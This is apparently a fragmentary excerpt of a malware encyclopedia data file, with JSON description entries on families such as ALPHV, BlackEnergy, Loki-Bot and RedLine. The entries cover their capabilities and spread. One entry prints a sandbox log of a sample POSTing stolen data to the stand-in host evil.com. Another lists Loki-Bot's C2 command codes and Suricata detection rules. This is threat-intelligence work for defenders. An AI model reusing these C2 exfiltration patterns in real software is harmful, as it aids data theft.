Once the malicious app is installed, attackers use social engineering tricks and window overlays to get credit card details from the victim.\r\nThe distribution vector seems to be fake apps from third-party app stores (not Google Play) or via malvertisement. After installation and activation, the app creates fake Gmail, Google Play and Chrome icons. Furthermore, the malware sends a fake system notification, telling the victim that they need to re-authenticate with Google Services and ask for their credit card details to be entered.\r\nCurrently the malware has overlays for over 2,200 apps of banks and financial institutions.",

      "description": "According to Unit42, TwoFace is a two-staged (loader+payload) webshell, written in C# and meant to run on webservers with ASP.NET. The author of the initial loader webshell included legitimate and expected content that will be displayed if a visitor accesses the shell in a browser, likely to remain undetected. The code in the loader webshell includes obfuscated variable names and the embedded payload is encoded and encrypted. To interact with the loader webshell, the threat actor uses HTTP POST requests to the compromised server.\r\n\r\nThe secondary webshell, which we call the payload, is embedded within the loader in encrypted form and contains additional functionality that we will discuss in further detail. When the threat actor wants to interact with the remote server, they provide data that the loader will use to modify a decryption key embedded within the loader that will be in turn used to decrypt the embedded TwoFace payload. Commands supported by the payload are execution of programs, up-, download and deletion of files and capability to manipulate MAC timestamps.",

ALPHV is marketed as ALPHV on cybercrime forums, but is commonly called BlackCat by security researchers due to an icon of a black cat appearing on its leak site. ALPHV has been observed being deployed in ransomware attacks since November 18, 2021.\r\n\r\nALPHV can be configured to encrypt files using either the AES or ChaCha20 algorithms. In order to maximize the amount of ransomed data, ALPHV can delete volume shadow copies, stop processes and services, and stop virtual machines on ESXi servers.

Cyclops Blink has been deployed since at least June 2019, fourteen months after VPNFilter was disrupted. In common with VPNFilter, Cyclops Blink deployment also appears indiscriminate and widespread. The actor has so far primarily deployed Cyclops Blink to WatchGuard devices, but it is likely that Sandworm would be capable of compiling the malware for other architectures and firmware.",

Conveniently, the Sorillus can be purchased via a variety of cryptocurrencies. The tool's creator and distributor, a YouTube user known as \"Tapt\", asserts that the tool is able to collect the following information from its target:\r\n- HardwareID\r\n- Username\r\n- Country\r\n- Language\r\n- Webcam\r\n- Headless\r\n- Operating system\r\n- Client Version",

Version 1.5 is notably more obfuscated and modular than previous versions, but the backdoor functions mostly remain the same: collect browser passwords, run remote commands and PowerShell, log keystrokes, among others.

Once a user has double-clicked the embedded image, the form executes a VB setup script.  The script writes files to the path %appdata%\\Roaming\\Microsoft\\Templates\\, then creates two task entries triggered to run daily.  The scripts are responsible for deobfuscating and executing the main JavaScript file mspromo.dot.  The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.  After deobfuscating the file, the main JavaScript is easily recognizable.  It contains a number of functions designed to drop files and execute scripts on a host system.  The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables.",

      "description": "CoinThief was a malware package designed to steal Bitcoins from the victim, consisting of a binary patcher, browser extensions, and a backdoor component. \r\n\r\nIt was spreading in early 2014 from several different sources: \r\n- on Github (where the trojanized compiled binary didn’t match the displayed source code), o\r\n- on popular and trusted download sites line CNET's Download.com or MacUpdate.com, and \r\n- as cracked applications via torrents camouflaged as Bitcoin Ticker TTM, BitVanity, StealthBit, Litecoin Ticker, BBEdit, Pixelmator, Angry Birds and Delicious Library.\r\n\r\nThe patcher‘s role was to locate and modify legitimate versions of the Bitcoin-Qt wallet application. The analyzed malware samples targeted versions of Bitcoin-Qt 0.8.1, 0.8.0 and 0.8.5. The earlier patch modified Bitcoin-Qt adding malicious code that would send nearly all the victim’s Bitcoins to one of the hard-coded addresses belonging to the attacker. \r\n\r\nThe browser extensions targeted Chrome and Firefox and are disguised as a “Pop-up blocker”. The extensions monitored visited websites, download malicious JavaScripts and injected them into various Bitcoin-related websites (mostly Bitcoin exchanges and online wallet sites). The injected JS scripts were able to modify transactions to redirect Bitcoin transfers to an attacker’s address or simply harvest login credentials to the targeted online service.\r\n\r\nThe backdoor enabled the attacker to take full control over the victim’s computer:\r\n- collect information about the infected computer\r\n- execute arbitrary shell scripts on the target computer\r\n- upload an arbitrary file from the victim’s hard drive to a remote server\r\n- update itself to a newer version",

After successful authentication, the interface offers several control panels to the attackers, allowing them to do the following actions:\r\n\r\n- Managing files\r\n- Listing processes\r\n- Connecting to various database management systems such as MySQL or SQLite\r\n- Connecting via bind/reverse shell\r\n- Executing shell command\r\n- Capturing and browsing images and videos from the victim’s webcam\r\n- Sending emails with an attachment",

      "description": "This crypto-ransomware for macOS was caught spreading via BitTorrent distribution sites in February 2017, masquerading as 'Patcher', an application used for pirating popular software like Adobe Premiere Pro or Microsoft Office for Mac.\r\n\r\nThe downloaded torrent contained an application bundle in the form of a single zip file. After launching the fake application, the main window of the fake cracking tool was displayed.\r\n\r\nThe file encryption process was launched after the misguided victim clicked 'Start'. Once executed, the ransomware generated a random 25-character string and set it as the key for RC4 encryption of all of the user's files. It then demanded ransom in Bitcoin, as instructed in the 'README!' .txt file copied all over the user's directories.\r\n\r\nDespite the instructions being quite thorough, Patcher lacked the functionality to communicate with any C&C server, and therefore made it impossible for its operators to decrypt affected files. The randomly generated encryption key was also too long to be guessed via a brute-force attack, leaving the encrypted data unrecoverable in a reasonable amount of time.",

The primary purpose of the dropper is to install a Tor client as well as a malicious CA certificate and proxy pac URL, in order to redirect traffic to targeted sites through their Tor node, effectively carrying out a MITM attack against selected web traffic. It also installs a custom hosts file to prevent access to Apple and VirusTotal. The macOS version shares its MO, many TTPs and infrastructure with the Windows counterpart.",

      "description": "A new form of ransomware named AlphaLocker that is built by cybercriminals for cybercriminals. Like all incarnations of Ransomware As A Service (RaaS), the AlphaLocker malware program can be purchased and launched by pretty much anyone who wants to get into the ransomware business. What makes AlphaLocker different from other forms of RaaS is its relatively cheap cost. The ransomware can be purchased for just $65 in bitcoin.\r\n\r\nAlphaLocker, also known as Alpha Ransomware, is based on the EDA2 ransomware, an educational project open-sourced on GitHub last year by Turkish researcher Utku Sen. A Russian coder seems to have cloned this repository before it was taken down and used it to create his ransomware, a near-perfect clone of EDA2. The ransomware's author, is said to be paying a great deal of attention to updating the ransomware with new features, so it would always stay ahead of antivirus engines, and evade detection.\r\n\r\nAlphaLocker's encryption process starts when the ransomware contacts its C&C server. The server generates a public and a private key via the RSA-2048 algorithm, sending the public key to the user's computer and saving the private key to its server. On the infected computer, the ransomware generates an AES-256 key for each file it encrypts, and then encrypts this key with the public RSA key, and sent to the C&C server.\r\n\r\nTo decrypt their files, users have to get ahold of the private RSA key which can decrypt the AES-encrypted files found on their computers. Users have to pay around 0.35 Bitcoin (~$450) to get this key, packaged within a nice decrypter.",

      "description": "Attor is a cyberespionage platform used in targeted attacks against diplomatic missions and governmental institutions since at least 2013. Its most interesting features are a complex modular architecture, elaborate network communications, and a unique plugin to fingerprint GSM/GPRS devices.\r\n\r\nAttor’s core lies in its dispatcher, which serves as a management unit for additional plugins which provide all of malware’s key capabilities. This allows the attackers to customize the platform on a per-victim basis. Plugins themselves are heavily synchronized. Network communication is based on Tor, aiming for anonymity and untraceability. \r\n\r\nThe most notable plugin can detect connected GSM/GPRS modems or mobile devices. Attor speaks to them directly using the AT command set, in order to collect sensitive information such as the IMEI, IMSI or MSISDN numbers, possibly identifying both the device and its subscriber. Other plugins provide persistence, an exfiltration channel, C&C communication and several further spying capabilities. The plugin responsible for capturing victim's screen targets social networks and blogging platforms, email services, office software, archiving utilities, file sharing and messaging services.",

      "description": "According to Bitdefender, BitRAT is a notorious remote access trojan (RAT) marketed on underground cybercriminal web markets and forums. Its price tag of $20 for lifetime access makes it irresistible to cybercriminals and helps the malicious payload spread.\r\n\r\nFurthermore, each buyer’s modus operandi makes BitRAT even harder to stop, considering it can be employed in various operations, such as trojanized software, phishing and watering hole attacks.\r\n\r\nBitRAT’s popularity arises from its versatility. The malicious tool can perform a wide range of operations, including data exfiltration, UAC bypass, DDoS attacks, clipboard monitoring, gaining unauthorized webcam access, credential theft, audio recording, XMRig coin mining and generic keylogging.",

ALPHV is written in the Rust programming language and supports execution on Windows, Linux-based operating systems (Debian, Ubuntu, ReadyNAS, Synology), and VMWare ESXi. ALPHV is marketed as ALPHV on cybercrime forums, but is commonly called BlackCat by security researchers due to an icon of a black cat appearing on its leak site. ALPHV has been observed being deployed in ransomware attacks since November 18, 2021.\r\n\r\nALPHV can be configured to encrypt files using either the AES or ChaCha20 algorithms. In order to maximize the amount of ransomed data, ALPHV can delete volume shadow copies, stop processes and services, and stop virtual machines on ESXi servers. ALPHV can self-propagate by using PsExec to remote execute itself on other hosts on the local network.",

      "description": "BlackEnergy, its first version shortened as BE1, started as a crimeware being sold in the Russian cyber underground as early as 2007. Initially, it was designed as a toolkit for creating botnets for conducting DDoS attacks. It supported a variety of flooding commands including protocols like ICMP, TCP SYN, UDP, HTTP and DNS. Among the high profile targets of cyber attacks utilising BE1 were a Norwegian bank and government websites in Georgia three weeks before Russo-Georgian War.\r\n\r\nVersion 2 of BlackEnergy, BE2, came in 2008 with a complete code rewrite that introduced a protective layer, a kernel-mode rootkit and a modular architecture. Plugins included mostly DDoS attacks, a spam plugin and two banking authentication plugins to steal from Russian nad Ukrainian banks. The banking plugin was paired with a module designed to destroy the filesystem. Moreover, BE2 was able to\r\n- download and execute a remote file;\r\n- execute a local file on the infected computer;\r\n- update the bot and its plugins;\r\n\r\nThe Industrial Control Systems Cyber Emergency Response Team issued an alert warning that BE2 was leveraging the human-machine interfaces of industrial control systems like GE CIMPLICITY, Advantech/Broadwin WebAccess, and Siemens WinCC to gain access to critical infrastructure networks.\r\n\r\nIn 2014, the BlackEnergy toolkit, BE3, switched to a lighter footprint with no kernel-mode driver component. Its plugins included:\r\n- operations with victim's filesystem\r\n- spreading with a parasitic infector\r\n- spying features like keylogging, screenshoots or a robust password stealer\r\n- Team viewer and a simple pseudo “remote desktop”\r\n- listing Windows accounts and scanning network \r\n- destroying the system\r\n\r\nTypical for distribution of BE3 was heavy use of spear-phishing emails containing Microsoft Word or Excel documents with a malicious VBA macro, Rich Text Format (RTF) documents embedding exploits or a PowerPoint presentation with zero-day exploit CVE-2014-4114.\r\n\r\nOn 23 December 2015, attackers behind the BlackEnergy malware successfully caused power outages for several hours in different regions of Ukraine. This cyber sabotage against three energy companies has been confirmed by the Ukrainian government. The power grid compromise has become known as the first-of-its-kind cyber warfare attack affecting civilians.",

      "description": "Cobalt Strike is a paid penetration testing product that allows an attacker to deploy an agent named 'Beacon' on the victim machine. Beacon includes a wealth of functionality to the attacker, including, but not limited to command execution, key logging, file transfer, SOCKS proxying, privilege escalation, mimikatz, port scanning and lateral movement. Beacon is in-memory/file-less, in that it consists of stageless or multi-stage shellcode that once loaded by exploiting a vulnerability or executing a shellcode loader, will reflectively load itself into the memory of a process without touching the disk. It supports C2 and staging over HTTP, HTTPS, DNS, SMB named pipes as well as forward and reverse TCP; Beacons can be daisy-chained. Cobalt Strike comes with a toolkit for developing shellcode loaders, called Artifact Kit.\r\n\r\nThe Beacon implant has become popular amongst targeted attackers and criminal users as it is well written, stable, and highly customizable.",

The payload was encrypted using RC4 and added to the cryptostub as a resource. The encryption key itself was stored inside the resource as well. Upon start the cryptostub would extract the key, decrypt the payload and perform a selfinjection using the now decrypted payload.\r\nNote: The packed sample provided contains some harmless payload, while the unpacked sample is the bare cryptostub without a payload.",

The social engineering in the low-volume DanaBot campaigns we have observed so far has been well-crafted, again pointing to a renewed focus on “quality over quantity” in email-based threats. DanaBot’s modular nature enables it to download additional components, increasing the flexibility and robust stealing and remote monitoring capabilities of this banker. ",

The DDoS attacks that DarkSky can perform include DNS amplification attacks, TCP (SYN) flood, UDP flood, and HTTP flood. The botnet can also perform a check to determine whether or not the DDoS attack succeeded and turn infected systems into a SOCKS/HTTP proxy to route traffic to a remote server.",

It typically delivers popular information stealers and remote access trojans (RATs) such as AgentTesla, AsyncRat, NanoCore, and RedLine. While it appears to primarily deliver commodity malware, Secureworks® Counter Threat Unit™ (CTU) researchers identified DarkTortilla samples delivering targeted payloads such as Cobalt Strike and Metasploit. It can also deliver \"addon packages\" such as additional malicious payloads, benign decoy documents, and executables. It features robust anti-analysis and anti-tamper controls that can make detection, analysis, and eradication challenging.\r\n\r\nFrom January 2021 through May 2022, an average of 93 unique DarkTortilla samples per week were uploaded to the VirusTotal analysis service. Code similarities suggest possible links between DarkTortilla and other malware: a crypter operated by the RATs Crew threat group, which was active between 2008 and 2012, and the Gameloader malware that emerged in 2021.",

For that, the malware uses the “Windows Default Print Monitor” name; that’s why we have named it DePriMon. Due to its complexity and modular architecture, researcher believe it to be a framework.\r\n\r\nDePriMon has been active since at least March 2017.

The attackers will scan the Internet for computers running RDP, usually on TCP port 3389, and then attempt to brute force the password for the computer.\r\n\r\nOnce they gain access to the computer they will install the ransomware and let it encrypt the computer. If the attackers are able to encrypt other computers on the network, they will attempt to do so as well.",

      "description": "OxCERT blog describes Dridex as \"an evasive, information-stealing malware variant; its goal is to acquire as many credentials as possible and return them via an encrypted tunnel to a Command-and-Control (C&C) server. These C&C servers are numerous and scattered all over the Internet, if the malware cannot reach one server it will try another. For this reason, network-based measures such as blocking the C&C IPs is effective only in the short-term.\"\r\nAccording to MalwareBytes, \"Dridex uses an older tactic of infection by attaching a Word document that utilizes macros to install malware. However, once new versions of Microsoft Office came out and users generally updated, such a threat subsided because it was no longer simple to infect a user with this method.\"\r\nIBM X-Force discovered \"a new version of the Dridex banking Trojan that takes advantage of a code injection technique called AtomBombing to infect systems. AtomBombing is a technique for injecting malicious code into the 'atom tables' that almost all versions of Windows uses to store certain application data. It is a variation of typical code injection attacks that take advantage of input validation errors to insert and to execute malicious code in a legitimate process or application. Dridex v4 is the first malware that uses the AtomBombing process to try and infect systems.\"",

The National Cyber Security Centre (NCSC), a part of the National Cybersecurity Authority (NCA), detected a new malware named \"DUSTMAN\" that was detonated on December 29, 2019. Based on analyzed evidence and artifacts found on machines in a victim’s network that were not wiped by the malware. NCSC assess that the threat actor behind the attack had some kind of urgency on executing the files on the date of the attack due to multiple OPSEC failures observed on the infected network. NCSC is calling the malware used in this attack \"DUSTMAN\" after the filename and string embedded in the malware. \"DUSTMAN\" can be considered as a new variant of \"ZeroCleare\" malware,\r\npublished in December 2019.",

It is generally dropped by the MiniDuke backdoor, but ESET also have seen the operators dropping FatDuke using lateral movement tools such as PsExec.The operators regularly repack this malware in order to evade detections. The most recent sample of FatDuke that ESET have seen was compiled on May 24, 2019. They have seen them trying to regain control of a machine multiple times in a few days, each time with  a different sample. Their packer, described in a later section, adds a lot of code, leading to large binaries. While the effective code should not be larger than 1MB, ESET have seen one sample weighing in at 13MB, hence our name for this backdoor component: FatDuke.",

Through their aggressive, albeit unusual, marketing strategies and constant recruitment of affiliates, they were able to globally distribute a high volume of their malware.\r\n\r\nIn a surprising announcement on May 31, 2019, the GandCrab’s operators posted on a dark web forum, announced the end of a little more than a year of ransomware operations, citing staggering profit figures. However, If there’s one thing that sets these threat actors apart from other groups, it is that they are unpredictable; so there is always the possibility that they might re-surface in one form or another.",

This first version of Gozi was developed by Nikita Kurmin, and he borrowed code from Ursnif aka Snifula, a spyware developed by Alexey Ivanov around 2000, and some other kits. Gozi v1.0 thus had a formgrabber module and often is classified as Ursnif aka Snifula.\r\n\r\nIn September 2010, the source code of a particular Gozi CRM dll version was leaked, which led to Vawtrak/Neverquest (in combination with Pony) via Gozi Prinimalka (a slightly modified Gozi v1.0) and Gozi v2.0 (aka 'Gozi ISFB' aka 'ISFB' aka Pandemyia).

      "description": "POS malware targets systems that run physical point-of-sale device and operates by inspecting the process memory for data that matches the structure of credit card data (Track1 and Track2 data), such as the account number, expiration date, and other information stored on a card’s magnetic stripe. After the cards are first scanned, the personal account number (PAN) and accompanying data sit in the point-of-sale system’s memory unencrypted while the system determines where to send it for authorization. \r\nMasked as the LogMein software, the GratefulPOS malware appears to have emerged during the fall 2017 shopping season with low detection ratio according to some of the earliest detections displayed on VirusTotal. The first sample was upload in November 2017. Additionally, this malware appears to be related to the Framework POS malware, which was linked to some of the high-profile merchant breaches in the past.",

      "description": "Havex is a remote access trojan (RAT) that was discovered in 2013 as part of a widespread espionage campaign targeting industrial control systems (ICS) used across numerous industries and attributed to a hacking group referred to as \"Dragonfly\" and \"Energetic Bear\". Havex is estimated to have impacted thousands of infrastructure sites, a majority of which were located in Europe and the United States. Within the energy sector, Havex specifically targeted energy grid operators, major electricity generation firms, petroleum pipeline operators, and industrial equipment providers. Havex also impacted organizations in the aviation, defense, pharmaceutical, and petrochemical industries.\r\n\r\nOnce installed, Havex scanned the infected system to locate any Supervisory Control and Data Acquisition (SCADA) or ICS devices on the network and sent the data back to command and control servers. To do so, the malware leveraged the Open Platform Communications (OPC) standard, which is a universal communication protocol used by ICS components across many industries that facilitates open connectivity and vendor equipment interoperability. Havex used the Distributed Component Object Model (DCOM) to connect to OPC servers inside of an ICS network and collect information such as CLSID, server name, Program ID, OPC version, vendor information, running state, group count, and server bandwidth.\r\n\r\nHavex was an intelligence-collection tool used for espionage and not for the disruption or destruction of industrial systems. However, the data collected by Havex would have aided efforts to design and develop attacks against specific targets or industries.",

Due to its small payload it was used as real attack vector over email phishing campaigns. Variants are still used in attacks.",

This needs more verification.\r\n* The filename remained static during analysis.\r\n* The original malware exe (ex. waroupada.exe) will spawn an instance of svchost.exe as a sub-process and then inject/execute its malicious code within it\r\n* If “/i” is not passed as an argument, it sets up persistence and waits for reboot.\r\n* If “/I” is passed as an argument (as is the case when the scheduled task is triggered at login), it skips persistence setup and actually executes; resulting in C2 communication.\r\n* Employs an interesting method for sleeping by calling the Sleep function of kernel32.dll from the shell, like so:\r\n      rundll32.exe kernel32,Sleep -s\r\n* Setup a local listener to proxy traffic on 127.0.0.1:50000\r\n\r\n**[Example Log from C2 Network Communication]**\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] connect\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: POST /forum/posting.php?a=0&b=4FC0302F4C59D8CDB8&d=0&e=63&f=0&g=0&h=0&r=0&i=266390&j=11 HTTP/1.1\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: Connection: close\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: Content-Type: application/x-www-form-urlencoded\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: Content-Length: 196\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: Host: evil.com\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] recv: <(POSTDATA)>\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] info: POST data stored to: /var/lib/inetsim/http/postdata/a90b931cb23df85aa6e3f0039958b031c3b053a2\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] info: **Request URL: hxxps://evil.com/forum/posting.php?a=0&b=4FC0302F4C59D8CDB8&d=0&e=63&f=0&g=0&h=0&r=0&i=266390&j=11**\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] info: Sending fake file configured for extension 'php'.\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: HTTP/1.1 200 OK\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: Content-Type: text/html\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: Server: INetSim HTTPs Server\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: Date: Mon, 19 Mar 2018 16:45:55 GMT\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: Connection: Close\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] send: Content-Length: 258\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] info: Sending file: /var/lib/inetsim/http/fakefiles/sample.html\r\n[2018-03-19 12:45:55] [42078] [https_443_tcp 44785] [172.16.0.130:54803] stat: 1 **method=POST url=hxxps://evil.com/forum/posting.php?a=0&b=4FC0302F4C59D8CDB8&d=0&e=63&f=0&g=0&h=0&r=0&i=266390&j=11** sent=/var/lib/inetsim/http/fakefiles/sample.html postdata=/var/lib/inetsim/http/postdata/a90b931cb23df85aa6e3f0039958b031c3b053a2",

They were feature-rich backdoors and turned the affected computer into a video camera, letting the attackers to spy the victim. \r\nThe malicious actors behind this malware were active at least since 2013 in highly targeted campaigns with only a few dozen compromised computers in Ukraine and Russia. The wrapper DLL posed as a legitimate mpr.dll library and was placed in the same folder as explorer.exe, which made it being loaded during the Windows startup into the Windows Explorer process instead of the legitimate library.\r\nMalware came in both 32-bit and 64-bit versions, which made this persistence technique functional on both architectures.\r\n\r\nThe smaller of the modules, RC2FM, contained a backdoor with fifteen supported commands indexed by numbers. The commands could perform simple changes on the system and spying features like capturing sounds, taking screenshots or monitoring all fixed and removable drives.\r\n\r\nThe second module, RC2CL, offered features for collecting as much data about the infected computer as possible, rather than for making system changes. The module supported up to 84 commands such as file system operations, file execution, registry key manipulation, remote shell activation, wireless network scanning, listing of installed software etc. Though the backdoor was capable of interfering with the system (e.g. to log off a user, terminate a process or shut down the system), it mostly provided passive operations. Whenever possible, it tried to hide its activities by restoring the original file access time or safe-deleting its traces. ",

      "description": "2006 Gozi v1.0, Gozi CRM, CRM, Papras\r\n2010 Gozi v2.0, Gozi ISFB, ISFB, Pandemyia(*)\r\n\r\nIn September 2010, the source code of a particular Gozi CRM dll version was leaked. This led to two main branches: one became known as Gozi Prinimalka, which was merge with Pony and became Vawtrak/Neverquest.\r\n\r\nThe other branch became known as Gozi ISFB, or ISFB in short. Webinject functionality was added to this version.\r\n\r\nThere is one panel which often was used in combination with ISFB: IAP. The panel's login page comes with the title 'Login - IAP'. The body contains 'AUTHORIZATION', 'Name:', 'Password:' and a single button 'Sign in' in a minimal design. Often, the panel is directly accessible by entering the C2 IP address in a browser. But there are ISFB versions which are not directly using IAP. The bot accesses a gate, which is called the 'Dreambot' gate. See win.dreambot for further information.\r\n\r\nISFB often was protected by Rovnix. This led to a further complication in the naming scheme - many companies started to call ISFB Rovnix. Because the signatures started to look for Rovnix, other trojans protected by Rovnix (in particular ReactorBot and Rerdom) sometimes got wrongly labelled.\r\n\r\nIn April 2016 a combination of Gozi ISFB and Nymaim was detected. This breed became known as GozNym. The merge uses a shellcode-like version of Gozi ISFB, that needs Nymaim to run. The C2 communication is performed by Nymaim.\r\n\r\nSee win.gozi for additional historical information.",

It has managed to leave hardly any traces on the Internet, is capable of watching its victims without ever being noticed, and can even corrupt a hard disk, thus making a PC useless.\r\n\r\nUsing Dynamic Threat Intelligence, they have observed multiple campaigns targeting multiple industries in the United States, United Kingdom, South Korea, Brazil, United Arab Emirates, Singapore, Canada, Peru and Poland – primarily in the financial services and insurance sectors. Although the infection strategy is not new, the final payload dropped – which they named LATENTBOT – caught attention since it implements several layers of obfuscation, a unique exfiltration mechanism, and has been very successful at infecting multiple organizations.",

      "description": "\"Loki Bot is a commodity malware sold on underground sites which is designed to steal private data from infected machines, and then submit that info to a command and control host via HTTP POST. This private data includes stored passwords, login credential information from Web browsers, and a variety of cryptocurrency wallets.\" - PhishMe\r\n\r\nLoki-Bot employs function hashing to obfuscate the libraries utilized. While not all functions are hashed, a vast majority of them are.\r\n\r\nLoki-Bot accepts a single argument/switch of ‘-u’ that simply delays execution (sleeps) for 10 seconds. This is used when Loki-Bot is upgrading itself.\r\n\r\nThe Mutex generated is the result of MD5 hashing the Machine GUID and trimming to 24-characters. For example: “B7E1C2CC98066B250DDB2123“.\r\n\r\nLoki-Bot creates a hidden folder within the %APPDATA% directory whose name is supplied by the 8th thru 13th characters of the Mutex. For example: “%APPDATA%\\ C98066\\”.\r\n\r\nThere can be four files within the hidden %APPDATA% directory at any given time: “.exe,” “.lck,” “.hdb” and “.kdb.” They will be named after characters 13 thru 18 of the Mutex. For example: “6B250D.” Below is the explanation of their purpose:\r\n\r\nFILE EXTENSION\tFILE DESCRIPTION\r\n.exe\tA copy of the malware that will execute every time the user account is logged into\r\n.lck\tA lock file created when either decrypting Windows Credentials or Keylogging to prevent resource conflicts\r\n.hdb\tA database of hashes for data that has already been exfiltrated to the C2 server\r\n.kdb\tA database of keylogger data that has yet to be sent to the C2 server\r\n\r\nIf the user is privileged, Loki-Bot sets up persistence within the registry under HKEY_LOCAL_MACHINE. If not, it sets up persistence under HKEY_CURRENT_USER.\r\n\r\nThe first packet transmitted by Loki-Bot contains application data.\r\n\r\nThe second packet transmitted by Loki-Bot contains decrypted Windows credentials.\r\n\r\nThe third packet transmitted by Loki-Bot is the malware requesting C2 commands from the C2 server. By default, Loki-Bot will send this request out every 10 minutes after the initial packet it sent.\r\n\r\nCommunications to the C2 server from the compromised host contain information about the user and system including the username, hostname, domain, screen resolution, privilege level, system architecture, and Operating System.\r\n\r\nThe first WORD of the HTTP Payload represents the Loki-Bot version.\r\n\r\nThe second WORD of the HTTP Payload is the Payload Type. Below is the table of identified payload types:\r\n\r\nBYTE\tPAYLOAD TYPE\r\n0x26\tStolen Cryptocurrency Wallet\r\n0x27\tStolen Application Data\r\n0x28\tGet C2 Commands from C2 Server\r\n0x29\tStolen File\r\n0x2A\tPOS (Point of Sale?)\r\n0x2B\tKeylogger Data\r\n0x2C\tScreenshot\r\n\r\nThe 11th byte of the HTTP Payload begins the Binary ID. This might be useful in tracking campaigns or specific threat actors. This value value is typically “ckav.ru”. If you come across a Binary ID that is different from this, take note!\r\n\r\nLoki-Bot encrypts both the URL and the registry key used for persistence using Triple DES encryption.\r\n\r\nThe Content-Key HTTP Header value is the result of hashing the HTTP Header values that precede it. This is likely used as a protection against researchers who wish to poke and prod at Loki-Bot’s C2 infrastructure.\r\n\r\nLoki-Bot can accept the following instructions from the C2 Server:\r\n\r\nBYTE\tINSTRUCTION DESCRIPTION\r\n0x00\tDownload EXE & Execute\r\n0x01\tDownload DLL & Load #1\r\n0x02\tDownload DLL & Load #2\r\n0x08\tDelete HDB File\r\n0x09\tStart Keylogger\r\n0x0A\tMine & Steal Data\r\n0x0E\tExit Loki-Bot\r\n0x0F\tUpgrade Loki-Bot\r\n0x10\tChange C2 Polling Frequency\r\n0x11\tDelete Executables & Exit\r\n\r\nSuricata Signatures\r\nRULE SID\tRULE NAME\r\n2024311\tET TROJAN Loki Bot Cryptocurrency Wallet Exfiltration Detected\r\n2024312\tET TROJAN Loki Bot Application/Credential Data Exfiltration Detected M1\r\n2024313\tET TROJAN Loki Bot Request for C2 Commands Detected M1\r\n2024314\tET TROJAN Loki Bot File Exfiltration Detected\r\n2024315\tET TROJAN Loki Bot Keylogger Data Exfiltration Detected M1\r\n2024316\tET TROJAN Loki Bot Screenshot Exfiltration Detected\r\n2024317\tET TROJAN Loki Bot Application/Credential Data Exfiltration Detected M2\r\n2024318\tET TROJAN Loki Bot Request for C2 Commands Detected M2\r\n2024319\tET TROJAN Loki Bot Keylogger Data Exfiltration Detected M2",

A single configuration file, jer.dll, is dropped, and it contains base64‑encoded text that corresponds to AES‑encrypted strings.\r\nGoogleCrash.exe is the main component of the malware. It schedules execution of the other two components and creates Windows Task Scheduler tasks to achieve persistence.\r\nRegarding the geolocation of victims, Chrome.exe collects data about nearby Wi-Fi networks and sends it to the Mozilla Location Service API. In short, this application provides geolocation coordinates when it’s given other sources of data such as Bluetooth beacons, cell towers or Wi-Fi access points. Then the malware takes latitude and longitude coordinates to build a Google Maps URL.\r\nThe GoogleUpdate.exe component is responsible for communicating with the remote C&C server. The configuration to set the connection is read from the jer.dll file: domain name, username and password. The principal means of communication for Machete is via FTP, although HTTP communication was implemented as a fallback in 2019.",

Affected files are overwritten with null character and receive a random 5 character file extension. Finally, shadow copies are removed and Windows startup repair is disabled to complicate recovery of data from the affected system. The desktop background is changed and a ransom note is dropped for the victim.

      "description": "RSA describes PlugX as a RAT (Remote Access Trojan) malware family that is around since 2008 and is used as a backdoor to control the victim's machine fully. Once the device is infected, an attacker can remotely execute several kinds of commands on the affected system.\r\n\r\nNotable features of this malware family are the ability to execute commands on the affected machine to retrieve:\r\nmachine information\r\ncapture the screen\r\nsend keyboard and mouse events\r\nkeylogging\r\nreboot the system\r\nmanage processes (create, kill and enumerate)\r\nmanage services (create, start, stop, etc.); and\r\nmanage Windows registry entries, open a shell, etc.\r\n\r\nThe malware also logs its events in a text log file.",

According to one source, ransom amounts demanded as part of PwndLocker activity range from $175k USD to $650k USD depending on the size of the network. PwndLocker attempts to disable a variety of Windows services so that their data can be encrypted. Various processes will also be targeted, such as web browsers and software related to security, backups, and databases. Shadow copies are cleared by the ransomware, and encryption of files occurs once the system has been prepared in this way. Executable files and those that are likely to be important for the system to continue to function appear to be skipped by the ransomware, and a large number of folders mostly related to Microsoft Windows system files are also ignored. As of March 2020, encrypted files have been observed with the added extensions of .key and .pwnd. Ransom notes are dropped in folders where encrypted files are found and also on the user's desktop.",

      "description": "RedLine Stealer is a malware available on underground forums for sale apparently as standalone ($100/$150 depending on the version) or also on a subscription basis ($100/month). This malware harvests information from browsers such as saved credentials, autocomplete data, and credit card information. A system inventory is also taken when running on a target machine, to include details such as the username, location data, hardware configuration, and information regarding installed security software. More recent versions of RedLine added the ability to steal cryptocurrency. FTP and IM clients are also apparently targeted by this family, and this malware has the ability to upload and download files, execute commands, and periodically send back information about the infected computer.",

The VBA installs a new root certificate and then forwards all traffic via TOR to the attacker controlled host in order to effectively MITM TLS traffic.",

